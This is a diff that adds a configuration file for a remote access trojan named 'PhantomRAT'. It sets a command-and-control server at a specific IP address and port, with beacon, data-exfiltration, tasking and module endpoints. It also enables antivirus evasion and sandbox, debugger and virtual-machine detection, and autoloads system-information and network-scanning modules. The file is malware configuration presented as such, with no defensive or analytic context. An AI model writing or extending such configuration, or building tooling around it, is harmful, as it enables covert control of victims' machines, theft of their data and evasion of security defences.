@@ -1,0 +1,45 @@
+# PhantomRAT Configuration v4.0
+system:
+  debug: false
+  log_level: "WARNING"
+  max_threads: 10
+  cache_size: "100MB"
+  
+c2:
+  server: "141.105.71.196"
+  port: 8000
+  ssl: false
+  endpoints:
+    beacon: "/phantom/beacon"
+    exfil: "/phantom/exfil"
+    tasks: "/phantom/tasks"
+    modules: "/phantom/modules"
+  
+encryption:
+  key_length: 32
+  algorithm: "AES-256-CBC"
+  iv_length: 16
+  
+modules:
+  autoload: ["system_info", "network_scanner"]
+  disabled: ["destructive", "noisy"]
+  cache_timeout: 300
+  
+performance:
+  beacon_interval: 30
+  max_file_size: "10MB"
+  compression: true
+  chunk_size: 8192
+  
+security:
+  antivirus_evasion: true
+  sandbox_detection: true
+  debugger_check: true
+  vm_detection: true
+  
+logging:
+  enabled: true
+  level: "ERROR"
+  file: "phantomrat.log"
+  max_size: "10MB"
+  backup_count: 3
